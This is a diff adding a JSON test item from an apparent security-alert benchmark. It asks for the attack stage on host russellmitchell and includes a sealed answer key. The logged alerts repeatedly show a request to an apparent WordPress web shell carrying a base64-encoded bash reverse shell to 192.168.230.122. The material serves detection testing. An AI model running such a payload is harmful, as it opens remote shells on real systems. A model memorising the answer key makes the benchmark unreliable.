@@ -1,0 +1,195 @@
+{
+  "incident_id": "ait-russellmitchell-reverse_shell",
+  "name": "AIT-ADS russellmitchell/reverse_shell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "russellmitchell/reverse_shell",
+  "alert": {
+    "timestamp": "2022-01-24T04:37:25Z",
+    "host": "russellmitchell",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on russellmitchell. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-24T04:37:25Z",
+    "end": "2022-01-24T04:37:25Z",
+    "hosts": [
+      "russellmitchell"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-c32d5e1c",
+        "timestamp": "2022-01-24T04:37:25Z",
+        "host": "russellmitchell",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-fb77698d",
+        "timestamp": "2022-01-24T04:37:25Z",
+        "host": "russellmitchell",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-fa8b40df",
+        "timestamp": "2022-01-24T04:37:25Z",
+        "host": "russellmitchell",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-c32d5e1c",
+      "source": "alerts",
+      "timestamp": "2022-01-24T04:37:25Z",
+      "host": "russellmitchell",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-fb77698d",
+      "source": "alerts",
+      "timestamp": "2022-01-24T04:37:25Z",
+      "host": "russellmitchell",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-fa8b40df",
+      "source": "alerts",
+      "timestamp": "2022-01-24T04:37:25Z",
+      "host": "russellmitchell",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642999045.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+          "message": "172.19.131.174 - - [24/Jan/2022:04:37:25 +0000] \"GET /wp-content/uploads/2022/01/ekmkimzkps-1642996700.9285.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIzMC4xMjIvNDcxMjQ7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd HTTP/1.1\" 200 506741 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "russellmitchell"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "russellmitchell"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on russellmitchell. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "russellmitchell"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "russellmitchell"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on russellmitchell. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "russellmitchell/reverse_shell",
+    "answer": "reverse_shell",
+    "accept": [
+      "reverse_shell",
+      "reverse shell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
